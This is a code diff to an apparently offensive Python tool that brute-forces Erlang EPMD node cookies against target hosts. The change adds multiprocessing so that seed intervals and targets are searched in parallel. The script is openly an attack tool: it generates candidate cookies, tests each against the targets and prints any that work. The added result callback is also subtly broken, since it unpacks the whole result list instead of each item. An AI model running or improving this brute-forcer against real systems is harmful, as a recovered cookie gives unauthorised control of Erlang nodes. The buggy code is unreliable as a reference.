@@ -2,6 +2,8 @@
 import argparse
 from os.path import isfile
 from time import time
+from multiprocessing import Pool
+from itertools import product
 from ERLPopper import *
 
 #   char full_space[] = "0,68719476735,100.0";
@@ -25,7 +27,33 @@ def parse_str_or_file(in_str):
 
     return list_lines
 
-def main():
+def print_result(res):
+    for r in res:
+        if r is not None:
+            (target, cookie) = res
+            print(f"[+] Good cookie ({target}): {cookie}")
+    #return res
+
+def go(target, interval, version, verbose):
+    (start, end) = interval.split(',')
+    interval_time_last = time()
+    interval_progress = int(start)
+    for i in range(int(start), int(end)):
+        if time() - interval_time_last > 5:
+            print(f"Cookies: {int((i-interval_progress)/5)}/s", end='\r')
+            interval_progress = i
+            interval_time_last = time()
+        cookie = ERLPopper.create_cookie_from_seed(i)
+        epop = ERLPopper(target=target, cookie=cookie, version=version, verbose=verbose)
+        if epop.check_cookie():
+            return (target, cookie)
+
+if __name__ == "__main__":
+    # [TODO] implement multithreading
+    #          One technique could be to divide up the loaded intervals evenly
+    #          among the maximum number of workers. This is what multiprocessing.pool
+    #          can be used for, I think.
+
     # Parse args
     parser = argparse.ArgumentParser(
             description="Attempt to brute force EPMD node cookie using various methods.",
@@ -38,6 +66,7 @@ def main():
     version_group.add_argument("--old", action="store_true", help="Use old handshake method (default).")
     version_group.add_argument("--new", action="store_true", help="Use new handshake method.")
     parser.add_argument("--verbose", action="store_true", help="Extra output for debugging.")
+    parser.add_argument("--processes", action="store", type=int, default=4, help="Number of processes to use (default: 4).")
 
     args = parser.parse_args()
 
@@ -45,23 +74,9 @@ def main():
     if args.new:
         version = 6
 
-    for target in args.target:
-        for interval in args.interval:
-            (start, end) = interval.split(',')
-            interval_time_last = time()
-            interval_progress = int(start)
-            for i in range(int(start), int(end)):
-                if time() - interval_time_last > 5:
-                    print(f"Cookies: {int((i-interval_progress)/5)}/s", end='\r')
-                    interval_progress = i
-                    interval_time_last = time()
-                cookie = ERLPopper.create_cookie_from_seed(i)
-                epop = ERLPopper(target=target, cookie=cookie, version=version, verbose=args.verbose)
-                if epop.check_cookie():
-                    print(f"[+]Good cookie ({target}): {cookie}")
-                    break
-        else:
-            continue
-                
-if __name__ == "__main__":
-    main()
+    targets_intervals_product = product(args.target, args.interval, [version], [args.verbose])
+
+    with Pool(processes=args.processes) as pool:
+        result = pool.starmap_async(func=go, iterable=targets_intervals_product, callback=print_result)
+
+        result.get()
